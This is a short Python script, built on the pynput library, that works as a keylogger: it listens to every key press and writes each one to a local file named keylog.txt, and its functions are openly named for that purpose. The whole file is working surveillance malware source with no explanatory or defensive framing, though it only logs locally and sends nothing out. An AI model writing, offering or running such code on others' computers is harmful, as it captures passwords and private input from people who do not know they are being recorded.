import time
from pynput import keyboard

def on_key_press(key):
    global log_file
    log_file.write(f"{key} pressed\n")
    log_file.flush()

def on_key_release(key):
    pass

def start_keylogger():
    global log_file
    log_file = open("keylog.txt", "w")
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
